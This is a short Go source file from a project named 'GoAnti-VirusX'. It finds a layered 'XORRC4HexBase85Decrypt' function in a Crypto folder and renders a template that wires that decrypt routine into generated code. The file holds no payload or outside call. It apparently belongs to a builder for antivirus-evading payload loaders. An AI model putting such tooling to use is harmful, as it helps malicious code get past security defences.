package selectfunctmpl

import (
	"GoAnti-VirusX/Utils"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"text/template"
)

const (
	TmplPath  = "Build/selectfunctmpl"
	TmplFile  = "selectfunc.tmpl"
	CryptoDir = "Crypto"
)

func SelectFunc(tmplName string) error {
	functions, err := GetExportedFunctionsFromFolder(CryptoDir)
	if err != nil {
		return err
	}

	for _, function := range functions {
		if strings.Contains(function, "XORRC4HexBase85Decrypt") {
			err := changeDecryptFunc(function, tmplName)
			if err != nil {
				return err
			}
		}
	}

	// 添加日志输出
	Utils.GetLogger().Info("All relevant functions processed successfully.")

	return nil
}

func changeDecryptFunc(decryptFunc, tmplName string) error {
	tmplPath := filepath.Join(TmplPath, TmplFile)
	templateContent, err := os.ReadFile(tmplPath)
	if err != nil {
		return fmt.Errorf("failed to read the template file: %s", err)
	}

	tmpl, err := template.New("ChangeDecryptFunc").Parse(string(templateContent))
	if err != nil {
		return fmt.Errorf("failed to create the template space: %s", err)
	}

	tmplFilePath := filepath.Join(TmplPath, tmplName)
	outFile, err := os.Create(tmplFilePath)
	if err != nil {
		return fmt.Errorf("failed to create the output file: %s", err)
	}
	defer outFile.Close()

	err = tmpl.Execute(outFile, map[string]interface{}{
		"decryptFunc": decryptFunc,
	})
	if err != nil {
		return fmt.Errorf("failed to render template: %s", err)
	}

	return nil
}
